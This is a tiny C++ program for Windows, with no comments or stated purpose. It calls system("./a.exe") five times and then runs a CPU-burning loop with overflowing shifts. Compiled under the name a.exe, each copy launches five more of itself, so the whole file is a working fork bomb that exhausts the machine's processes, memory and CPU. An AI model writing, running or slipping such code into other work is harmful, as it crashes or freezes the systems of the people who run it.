#include <iostream>
#include <windows.h>

int main() {
	char * xd = "./a.exe";
	system(xd);
	system(xd);
	system(xd);
	system(xd);
	system(xd);
	int n = 0;
	for (int i = 1; i != 0; ++i)
	{
		n++;
		int xd = n * 2;
		n = xd - (7 << xd);
	}
}